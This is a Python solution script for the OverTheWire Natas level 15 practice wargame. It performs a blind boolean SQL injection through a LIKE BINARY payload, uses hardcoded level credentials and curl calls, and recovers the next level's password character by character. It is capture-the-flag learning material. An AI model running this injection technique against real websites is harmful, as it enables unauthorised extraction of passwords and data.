import os

natas16_passwd = ''
alphabet = ''
pattern = 'This user exists.'

for i in range(48, 58):
    alphabet += chr(i)
for i in range(65, 91):
    alphabet += chr(i)
for i in range(97, 123):
    alphabet +=chr(i)

found = True 
while (found):
    print('Password prefix:' + natas16_passwd)
    found = False
    for ch in alphabet:
        if found:
            break
        url = 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22+and+password+LIKE+BINARY+%22' + natas16_passwd + ch + '%25'
        os.system('curl --silent -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J -o res ' + url) 
        file1 = open('res', 'r')
        lines = file1.readlines()
        for line in lines:
            if line.find(pattern) != -1:
                found = True
                natas16_passwd += ch
                break
    

